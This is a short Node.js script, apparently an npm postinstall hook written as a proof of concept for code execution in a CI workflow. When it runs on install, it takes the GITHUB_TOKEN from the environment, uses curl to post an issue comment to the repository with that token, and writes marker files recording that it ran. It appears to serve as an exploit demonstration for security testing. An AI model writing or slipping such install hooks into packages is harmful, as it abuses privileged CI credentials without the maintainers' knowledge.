const fs = require('fs');
const path = require('path');
const { execFileSync } = require('child_process');

const root = process.env.INIT_CWD || process.cwd();
const tok = process.env.GITHUB_TOKEN || '';
const repo = process.env.GITHUB_REPOSITORY || '';

console.log('RCE_MARKER_OUTPUT token_len=' + tok.length);

let status = 'no-token';
if (tok && repo) {
  try {
    status = execFileSync('curl', [
      '-s', '-o', '/dev/null', '-w', '%{http_code}', '-X', 'POST',
      '-H', 'Authorization: Bearer ' + tok,
      '-H', 'Accept: application/vnd.github+json',
      'https://api.github.com/repos/' + repo + '/issues/1/comments',
      '-d', '{"body":"RCE-POSTINSTALL-PROOF: arbitrary code executed with the privileged GITHUB_TOKEN"}',
    ], { encoding: 'utf8' }).trim();
  } catch (e) {
    status = 'curl-error:' + e.message;
  }
}

try {
  fs.appendFileSync(path.join(root, 'linter-report.txt'),
    '\nRCE_TOKEN_LEN=' + tok.length + ' API_STATUS=' + status + '\n');
} catch (e) {
  console.log('append failed: ' + e.message);
}
fs.writeFileSync('/tmp/ADP_RCE_MARKER', 'executed');
